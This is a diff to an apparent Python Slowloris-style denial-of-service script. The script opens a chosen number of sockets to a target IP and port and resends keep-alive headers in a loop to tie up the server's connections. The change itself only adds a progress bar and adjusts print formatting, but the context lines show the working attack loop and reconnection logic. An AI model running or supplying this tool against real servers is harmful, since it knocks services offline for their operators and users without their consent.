@@ -2,6 +2,7 @@ import sys
 import random
 import socket
 import time
+from progress.bar import Bar
 
 regular_headers = [
             "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
@@ -24,16 +25,19 @@ def main():
     ip = sys.argv[1]
     port = sys.argv[2]
     socket_count= int(sys.argv[3])
+    bar = Bar('Processing', max=socket_count)
     timer = int(sys.argv[4])
     print("Creating Sockets...")
     socket_list=[]
     for _ in range(int(socket_count)):
         try:
-            print("Creating Socket# {}".format(_))
+            print("{}Creating Socket# {}".format("\n",_))
             s=init_socket(ip,port)
         except socket.error:
             break
         socket_list.append(s)
+        bar.next()
+    bar.finish()
     while True:
         print("Sending Keep-Alive Headers to {}".format(len(socket_list)))
         for s in socket_list:
@@ -42,13 +46,15 @@ def main():
             except socket.error:
                 socket_list.remove(s)
         for _ in range(socket_count - len(socket_list)):
-            print("Re-creating Socket...")
+            print("{}Re-creating Socket...".format("\n"))
             try:
                 s=init_socket(ip,port)
                 if s:
                     socket_list.append(s)
+                    bar.next()
             except socket.error:
                 break
+        bar.finish()
         time.sleep(timer)
 if __name__=="__main__":
     main()
